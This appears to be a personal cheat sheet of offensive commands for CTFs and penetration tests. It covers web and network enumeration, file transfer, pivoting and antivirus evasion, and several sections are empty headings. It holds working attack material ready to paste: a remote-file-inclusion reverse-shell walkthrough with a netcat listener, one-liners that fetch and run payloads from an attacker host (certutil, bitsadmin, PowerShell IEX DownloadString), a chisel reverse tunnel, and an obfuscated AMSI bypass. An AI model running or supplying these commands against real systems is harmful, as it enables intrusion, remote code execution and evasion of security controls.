# Pentest Common Commands Reference
This is a cheat sheet of common and useful commands I use for CTFs and Penetration Tests. This is primarily focused on offensive security operations in a network or against a single target host.

Prereqs:
Download and install my tools from here:
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/1st_download_tools_payloads.sh
- https://github.com/Z333RO/security-tools-public/blob/main/kali_autosetup/2nd_update_install.sh

# Web Enumeration 
## dirb
```
dirb http://172.0.0.1/
dirb http://172.0.0.1/ /path/to/wordlist.txt
```

## ffuf
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt:FUZZ -u http://192.10.10.10/FUZZ -recursion -recursion-depth 1 -e .php -v 
```

## gobuster
```
gobuster -k -u https://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40
```

## dirsearch

```
sudo dirsearch -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.13/ -e all -t 50
```

## nuclei
```
# Basic commands
nuclei -u http://10.10.10.13
nuclei -u http://website.com

# Run this over proxychains to scan a target on another subnet - ie chisel
proxychains -q nuclei -proxy 'socks5://localhost:1080' -u 172.16.1.19
```

## WPScan


## Axiom 


# Network Enumeration 
## rustscan
```
Scan all ports
rustscan -a 10.10.10.13 --ulimit 5000 --range 1-65535 -- -sVC -Pn
rustscan -a 10.10.10.0/24 --ulimit 5000 --range 1-65535 -- -sVC -Pn
```

## nmap 
```
nmap -sVC 10.10.10.13
nmap -sVC 10.10.10.0/24
```

## crackmapexec
```
crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares
crackmapexec smb 10.10.110.0/24 -u users.txt -p password.txt continue-on-success

```
## enum4linux

## enum4linux-ng

## Autorecon

## smbmap

## manspider

## bloodhound


# Common and Useful Exploit Methods - Footholds
## File Upload - Reverse Shells 

## RFI - Remote File Inclusion
Find a file path on URL that can read internal files on target (LFI) or read external pages from other sites (RFI). See below example on how to execute - (example is for a web server running on linux:
Attacker Machine
```
cd /server
cp /usr/share/laudanum/php/php-reverse-shell.php .
```
Here make sure to edit the payload to be your attacker IP and port and run netcat.
```
gedit php-reverse-shell.php
python3 -m http.server 80
rlwrap nc -lvnp 443
```

# Target machine - you can either directly browse to the file from browser or run curl command to trigger it, remember to have netcat running
```
Browse to http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php
or
curl "http://target_IP/image.php?img=http://attacker_IP/php-reverse-shell.php"
```

# File Transfer Methods
## Linux - wget
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
wget http://atacker_ip:80/name_of_file.php
```

## Windows - certutil
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE
certutil -urlcache -f http://attacker_ip:80/name_of_file.exe
```

## Windows - powershell
```
# Attacker machine
cd server/
python3 -m http.server 80

# Target machine you have shell or RCE (various commands by line - pick what you want)
powershell wget http://attacker_ip/nc.exe -outfile nc.exe

# Run "powershell -ep bypass" first
IEX (New-Object Net.WebClient).DownloadString("http://attacker_ip/PowerView.ps1")
```

## Windows - LOLBAS
```
bitsadmin.exe /transfer /Download /priority Foreground http://attacker_IP:80/name_of_file.exe
```

## smbserver
Check your kali machine on /tmp/smbshare and you can now transfer files to and from the target. On target machine, if you have RDP, you can easily check the network share on file explorer and transfer over files
```
# Attacker machine
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# Target machine
net use n: \\192.168.220.133\share /user:test test
```

## RDP Mount
First one is with user and pass, second line is for user and NT hash. Once you successfully connect, you should see on the file explorer the network share and you can transfer files to and from your kali machine to target. Files will appear in your /tmp folder.
```
xfreerdp /v:target_IP /u:user /p:password9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
xfreerdp /v:target_IP /u:user /pth:NT_HASH /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

## NFS Mount

# Cracking and Bruteforce

## Hydra

## John

## Hashcat

## FFUF

## WPScan Bruteforce

# Local Enumeration for Privesc
## Linux
### Linpeas

### Linux Exploit Suggester

### PsPY


## Windows
### Winpeas

### Windows Exploit Suggester

# Common and Useful Exploit Methods - PrivEsc
## PwnKit

## Kernel Exploits

## Potatoes



# Post Exploitation 
## Mimikatz

## LaZagne

## Snaffler

## ADPEASS

## 

# AV Bypass Techniques

## AMSI Bypass
Paste this into the command line and run before executing powershell scripts:
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```


# Pivoting

## SSH Tunneling 

## Chisel
```
# On our attacker machine
chisel server -p 8001 --reverse
gedit /etc/proxychains4.conf

# Add this in /etc/proxychains4.conf file to the bottom and comment out any other proxies
socks5 127.0.0.1 1080

# Run a python server on our attacker machine where we have the chisel binary hosted, usually in the ~/server folder
python3 -m http.server 80

# Target machine where you have shell
# upload chisel to target machine - run this from root at the target 
wget http://attacker_ip:80/chisel
chmod +x chisel
./chisel client attacker_ip:8001 R:1080:socks

# Now do a quick test to see if you can reach the internal network
proxychains -q crackmapexec smb 10.10.11.0/24 -u '' -p '' --shares
```

## Metasploit Proxy

# Misc Commands

## docker commands

# Troubleshooting

## Corrupt zsh history file fix
```
cd ~
mv .zsh_history .zsh_history_bad
strings -eS .zsh_history_bad > .zsh_history
fc -R .zsh_history
```
